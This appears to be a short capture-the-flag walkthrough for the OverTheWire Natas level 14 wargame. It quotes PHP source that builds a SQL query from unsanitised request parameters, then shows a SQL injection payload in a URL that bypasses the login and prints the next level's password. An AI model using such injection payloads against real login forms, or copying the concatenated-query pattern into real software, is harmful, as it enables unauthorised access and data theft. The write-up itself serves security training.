@@ -1,0 +1,33 @@
+Video Solution: https://youtu.be/SjGXUDQ-0Jc
+Task on Overthewire: http://overthewire.org/wargames/natas/
+
+http://natas14.natas.labs.overthewire.org/index-source.html
+
+<? 
+if(array_key_exists("username", $_REQUEST)) { 
+    $link = mysql_connect('localhost', 'natas14', '<censored>'); 
+    mysql_select_db('natas14', $link); 
+     
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\""; 
+    if(array_key_exists("debug", $_GET)) { 
+        echo "Executing query: $query<br>"; 
+    } 
+
+    if(mysql_num_rows(mysql_query($query, $link)) > 0) { 
+            echo "Successful login! The password for natas15 is <censored><br>"; 
+    } else { 
+            echo "Access denied!<br>"; 
+    } 
+    mysql_close($link); 
+} else { 
+?> 
+
+http://natas14.natas.labs.overthewire.org/index.php?debug&username=test&password=test
+
+Executing query: SELECT * from users where username="test" and password="test"
+Access denied!
+
+http://natas14.natas.labs.overthewire.org/index.php?debug&username=test" OR"1"="1 &password=test" OR"1"="1
+
+Executing query: SELECT * from users where username="test" OR"1"="1 " and password="test" OR"1"="1"
+Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
